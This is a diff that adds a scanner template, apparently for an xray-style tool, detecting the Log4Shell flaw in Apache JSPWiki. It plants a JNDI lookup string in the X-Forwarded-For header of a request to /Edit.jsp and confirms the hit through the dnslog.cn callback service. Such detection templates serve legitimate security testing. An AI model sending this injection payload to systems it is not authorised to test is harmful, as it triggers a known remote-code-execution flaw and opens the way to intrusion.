@@ -1,0 +1,31 @@
+name: Apache JSPWiki Log4shell CVE-2021-44228 (1)
+manual: true
+query: ( body="<div>JSPWiki" | title="JSPWiki")
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getdomain.php
+    expression: response.status == 200
+    output:
+      dnstest: response.body
+  r1:
+    request:
+      method: GET
+      path: /Edit.jsp?page=Main
+      headers:
+        X-Forwarded-For: ${jndi:dns://{{dnstest}}/tea}
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getrecords.php
+    expression: response.status == 200 && response.body.bcontains(b"{{dnstest}}")
+expression: r0() && r1() && r2()
+detail:
+  author: aetkrad
+  links:
+  - https://mp.weixin.qq.com/s?__biz=MzA5OTA0MTU4Mg==&mid=2247485581&idx=1&sn=033cafb1442d44e6cfc85796e42f206d
+  description: Apache JSPWiki /Edit.jsp?page=Main存在log4j漏洞，会读取X-Forwarded-For参数。
+  tags: rce
